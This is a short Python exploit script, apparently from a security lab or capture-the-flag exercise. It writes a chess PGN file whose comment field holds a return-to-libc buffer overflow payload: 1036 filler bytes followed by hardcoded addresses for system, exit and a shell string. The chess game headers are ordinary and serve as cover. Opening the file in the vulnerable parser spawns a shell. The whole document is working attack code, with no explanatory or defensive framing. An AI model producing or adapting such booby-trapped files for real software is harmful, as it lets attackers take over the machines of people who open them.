import struct

def conv(n):
	return struct.pack("<I",n)

'''
system - 0xb7e53310
exit   - 0xb7e46260
SHELL  - 0xb7f75d4c

'''
payload = "A"*1036 + conv(0xb7e53310) + conv(0xb7e46260) + conv(0xb7f75d4c)

with open('mal_file4.pgn', 'w') as the_file:
    the_file.write('[Event "State Ch."]\n')
    the_file.write('[White "Capablanca"]\n')
    the_file.write('[Black "Jaffe"]\n')
    the_file.write('[Result "1-0"]\n')
    the_file.write('[Board "4r3/6P1/2p2P1k/1p6/pP2p1R1/P1B5/2P2K2/3r4"]\n')
    the_file.write('[CommentSTX]\n')
    the_file.write(payload)
    the_file.write('\n[CommentEND]')